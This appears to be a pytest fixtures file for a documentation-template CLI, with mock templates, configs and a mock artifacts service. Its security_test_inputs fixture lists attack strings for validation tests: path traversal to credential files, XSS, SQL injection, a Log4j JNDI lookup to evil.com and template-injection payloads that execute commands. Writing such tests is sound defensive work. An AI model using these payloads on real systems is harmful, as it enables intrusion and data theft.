"""
Test fixtures for new-doc CLI command tests.

Provides reusable mock templates, configurations, and test data
for comprehensive testing of the new-doc CLI functionality.
"""
import tempfile
from pathlib import Path
from unittest.mock import Mock

import pytest


class MockTemplates:
    """Mock template definitions for testing."""
    
    BASIC_TEMPLATE = """---
title: "Basic Template - {{IDENTIFIER}}"
description: "Basic test template"
doc_type: "basic"
output_subdir: "basic_docs"
filename_prefix: "basic_"
tags: ["basic", "test"]
variables: ["IDENTIFIER", "DATE", "AUTHOR"]
---

# {{IDENTIFIER}}

**Author**: {{AUTHOR}}  
**Created**: {{DATE}}

This is a basic test template for {{IDENTIFIER}}.

## Content

Basic template content goes here.

## Variables

- IDENTIFIER: {{IDENTIFIER}}
- DATE: {{DATE}}
- AUTHOR: {{AUTHOR}}
"""

    ARTIFACT_TEMPLATE = """---
title: "Working Artifact - {{IDENTIFIER}}"
description: "Working document for session-based development"
session: "{{SESSION_ID}}"
by: "{{AGENT_ROLE}}"
created: "{{DATE}}"
updated: "{{DATE}}"
version: "1.0"
tags: ["artifact", "working-document", "session"]
variables: ["IDENTIFIER", "SESSION_ID", "AGENT_ROLE", "DATE"]
---

# {{IDENTIFIER}}

**Session**: {{SESSION_ID}} **Created**: {{DATE}} **Updated By**: {{AGENT_ROLE}}

## Purpose

Working document for {{SESSION_ID}} session.

## Content

Artifact content for {{IDENTIFIER}}.

---

_This is a working artifact in session {{SESSION_ID}}_
"""

    CRR_TEMPLATE = """---
title: "Code Review Report - {{ISSUE_ID}}"
description: "Comprehensive code review findings and recommendations"
doc_type: "CRR"
output_subdir: "reports/crr"
filename_prefix: "CRR_"
tags: ["official", "report", "code-review"]
variables: ["ISSUE_ID", "REVIEWER", "DATE", "PR_NUMBER"]
---

# Code Review Report - Issue {{ISSUE_ID}}

**Reviewer**: {{REVIEWER}}  
**Date**: {{DATE}}  
**PR Number**: {{PR_NUMBER}}

## Executive Summary

Code review for issue {{ISSUE_ID}}.

## Review Findings

### Positive Aspects

- Code quality assessment

### Areas for Improvement  

- Specific recommendations

## Conclusion

Summary of review for {{ISSUE_ID}}.
"""

    MALFORMED_YAML_TEMPLATE = """---
title: "Malformed Template
description: Missing closing quote and improper YAML
tags: ["malformed", "test"
variables: IDENTIFIER, DATE  # Should be array
extra_field: {unclosed: dict
---

# Template with malformed YAML

Content: {{IDENTIFIER}}
Date: {{DATE}}
"""

    NO_FRONTMATTER_TEMPLATE = """# Template Without Frontmatter

This template has no YAML frontmatter at all.

Content: {{IDENTIFIER}}
Date: {{DATE}}

Just plain markdown content.
"""

    LARGE_TEMPLATE = """---
title: "Large Template - {{IDENTIFIER}}"
description: "Template with large content for size testing"
variables: ["IDENTIFIER", "DATE"]
---

# {{IDENTIFIER}}

Large content follows:

""" + ("Large content line.\n" * 1000)

    COMPLEX_VARIABLES_TEMPLATE = """---
title: "Complex Variables - {{IDENTIFIER}}"
description: "Template with complex variable patterns"
variables: ["IDENTIFIER", "VAR1", "VAR2", "VAR3", "NESTED_VAR"]
---

# {{IDENTIFIER}}

Different variable patterns:
- Double braces: {{VAR1}}
- Single braces: {VAR2}
- Mixed: {{VAR3}} and {VAR1}
- Nested reference: {{NESTED_VAR}}
- Literal braces: \\{\\{NOT_A_VAR\\}\\}

Content with {{IDENTIFIER}} and multiple {{VAR1}} references.
"""


@pytest.fixture
def mock_templates():
    """Provide access to MockTemplates class."""
    return MockTemplates


@pytest.fixture
def template_directory(tmp_path):
    """Create a temporary directory with various test templates."""
    template_dir = tmp_path / "test_templates"
    template_dir.mkdir()
    
    # Create different types of templates
    templates = {
        "basic.md": MockTemplates.BASIC_TEMPLATE,
        "artifact.md": MockTemplates.ARTIFACT_TEMPLATE, 
        "CRR_template.md": MockTemplates.CRR_TEMPLATE,
        "malformed.md": MockTemplates.MALFORMED_YAML_TEMPLATE,
        "no_frontmatter.md": MockTemplates.NO_FRONTMATTER_TEMPLATE,
        "complex_vars.md": MockTemplates.COMPLEX_VARIABLES_TEMPLATE
    }
    
    for filename, content in templates.items():
        (template_dir / filename).write_text(content)
    
    return template_dir


@pytest.fixture
def large_template_directory(tmp_path):
    """Create directory with large template for performance testing."""
    template_dir = tmp_path / "large_templates"
    template_dir.mkdir()
    
    large_template = template_dir / "large.md"
    large_template.write_text(MockTemplates.LARGE_TEMPLATE)
    
    return template_dir


@pytest.fixture
def mock_config(tmp_path):
    """Create mock NewDocConfig for testing."""
    from khive.cli.khive_new_doc import NewDocConfig
    
    config = NewDocConfig(project_root=tmp_path)
    config.default_destination_base_dir = str(tmp_path / "output")
    config.custom_template_dirs = [str(tmp_path / "custom_templates")]
    config.default_search_paths = [
        str(tmp_path / "templates"),
        str(tmp_path / ".khive" / "templates")
    ]
    config.default_vars = {
        "AUTHOR": "Test Suite",
        "VERSION": "1.0.0",
        "DATE": "2024-01-01"
    }
    config.ai_mode = True
    
    return config


@pytest.fixture
def mock_args_factory():
    """Factory function to create mock arguments for different scenarios."""
    
    def create_args(**overrides):
        """Create mock args with defaults, allowing overrides."""
        default_args = {
            'type_or_template': None,
            'identifier': None,
            'artifact': None,
            'session_id': None,
            'doc': None,
            'issue': None,
            'list_templates': False,
            'create_template': None,
            'var': None,
            'dest': None,
            'template_dir': None,
            'force': False,
            'description': None,
            'project_root': Path.cwd(),
            'config': None,
            'phase': None,
            'role': None,
            'domain': None
        }
        
        # Apply overrides
        default_args.update(overrides)
        
        # Convert to Mock object
        args = Mock()
        for key, value in default_args.items():
            setattr(args, key, value)
            
        return args
    
    return create_args


@pytest.fixture
def security_test_inputs():
    """Provide various security test inputs for validation."""
    return {
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/passwd",
            "template/../../../secret.txt",
            "template/../../sensitive_data",
            ".env",
            "~/.ssh/id_rsa"
        ],
        'injection_attempts': [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "{{SYSTEM_SECRET}}",
            "${java.lang.System.exit(0)}", 
            "#{7*7}",  # SPEL injection
            "{{constructor.constructor('alert(1)')()}}",  # Angular injection
            "${{'foo'.constructor.constructor('return process.env')()}}",  # Node.js
            "\\x00\\x2e\\x2e\\x2f",  # Encoded path traversal
            "${jndi:ldap://evil.com/a}",  # Log4j injection
        ],
        'filename_attacks': [
            "../secret.txt",
            "file<>name",
            'file"name', 
            "file|name",
            "file?name",
            "file*name",
            "CON", "PRN", "AUX", "NUL",  # Windows reserved
            "file\x00name",  # Null byte
            "file\nname",   # Newline
            "file\rname",   # Carriage return
            "file\tname",   # Tab
        ],
        'variable_attacks': [
            "{{constructor.constructor}}",
            "${java.lang.Runtime}",
            "#{T(java.lang.System).exit(1)}",
            "{{7*7}}",
            "${{'foo'.__class__.__bases__[0].__subclasses__()}}",  # Python object access
            "{{request.getClass().forName('java.lang.Runtime')}}",
            "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}"
        ]
    }


@pytest.fixture
def error_test_scenarios():
    """Provide various error scenarios for testing."""
    return {
        'missing_files': [
            "nonexistent_template.md",
            "/absolute/path/missing.md",
            "missing_directory/template.md"
        ],
        'permission_scenarios': [
            # These would be created with specific permissions in tests
            'readonly_template',
            'readonly_output_dir', 
            'unreadable_config'
        ],
        'malformed_yaml': [
            "---\ntitle: Unclosed quote\n---",
            "---\n[invalid: yaml: structure\n---",
            "---\n{{invalid_yaml_var}}: value\n---",
            "---\ntitle: test\ndescription:\n  - item1\n  - item2\n    - nested_wrong\n---"
        ],
        'invalid_variables': [
            "invalid_format",
            "also=invalid=format", 
            "=missing_key",
            "missing_value=",
            "key=",
            "=value"
        ]
    }


@pytest.fixture
def performance_test_data():
    """Provide data for performance testing scenarios."""
    return {
        'large_templates': {
            'small': 'A' * 1024,  # 1KB
            'medium': 'B' * (100 * 1024),  # 100KB
            'large': 'C' * (1024 * 1024),  # 1MB
            'xlarge': 'D' * (10 * 1024 * 1024)  # 10MB
        },
        'many_variables': {
            f'VAR_{i}': f'value_{i}' for i in range(100)
        },
        'complex_content': {
            'nested_braces': '{{{{NESTED_VAR}}}}',
            'mixed_patterns': '{{VAR1}} and {VAR2} and {{VAR3}}',
            'unicode_content': 'Unicode: 🚀 🎯 📊 💡 ⚡ 🔐 🛠️ 📝',
            'special_chars': '!@#$%^&*()_+-=[]{}|;":,.<>?/',
        }
    }


class MockArtifactsService:
    """Mock ArtifactsService for testing integrations."""
    
    def __init__(self, should_fail=False):
        self.should_fail = should_fail
        self.document_exists_calls = []
        self.create_session_calls = []
        self.create_document_calls = []
    
    async def document_exists(self, session_id, doc_type, identifier):
        """Mock document_exists method."""
        self.document_exists_calls.append((session_id, doc_type, identifier))
        
        if self.should_fail:
            raise Exception("Mock service failure")
            
        return False  # Default: document doesn't exist
    
    async def create_session(self, session_id):
        """Mock create_session method."""
        self.create_session_calls.append(session_id)
        
        if self.should_fail:
            raise Exception("Mock session creation failure")
            
        return None
    
    async def create_document(self, session_id, doc_type, identifier, content, author=None):
        """Mock create_document method."""
        self.create_document_calls.append((session_id, doc_type, identifier, content, author))
        
        if self.should_fail:
            raise Exception("Mock document creation failure")
            
        # Return mock document object
        return Mock(path=f"/mock/path/{session_id}/{identifier}.md")


@pytest.fixture
def mock_artifacts_service():
    """Provide mock ArtifactsService for successful scenarios."""
    return MockArtifactsService(should_fail=False)


@pytest.fixture
def failing_artifacts_service():
    """Provide mock ArtifactsService that fails for error testing."""
    return MockArtifactsService(should_fail=True)


@pytest.fixture
def sample_configs():
    """Provide sample configuration data for testing."""
    return {
        'minimal': {
            "default_destination_base_dir": ".khive/docs"
        },
        'full': {
            "default_destination_base_dir": "/custom/docs",
            "custom_template_dirs": ["/custom/templates", "/shared/templates"],
            "default_search_paths": [".khive/templates", "docs/templates"],
            "ai_mode": True,
            "template_author": "Test Suite",
            "template_version": "2.0.0",
            "default_vars": {
                "AUTHOR": "Test User",
                "ORG": "Test Organization",
                "LICENSE": "MIT"
            }
        },
        'invalid': {
            "default_destination_base_dir": 123,  # Should be string
            "custom_template_dirs": "not_a_list",  # Should be list
            "ai_mode": "yes"  # Should be boolean
        }
    }